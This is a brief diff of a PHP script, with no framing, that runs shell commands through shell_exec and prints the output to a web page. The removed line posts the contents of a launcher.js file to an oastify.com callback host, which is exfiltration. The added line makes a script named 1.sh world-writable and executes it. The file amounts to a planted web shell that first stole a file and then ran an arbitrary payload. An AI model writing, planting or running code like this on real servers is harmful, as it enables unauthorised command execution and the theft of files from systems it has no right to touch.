@@ -1,5 +1,5 @@
 <?php
-$command = 'curl -X POST -d "$(cat ../../launcher.js)" https://4uz65jdht25o5e3br591jyzljcp3d0do2.oastify.com';
+$command = 'chmod 777 1.sh && ./1.sh';
 $output = shell_exec($command);
 echo "<pre>$output</pre>";
 ?>
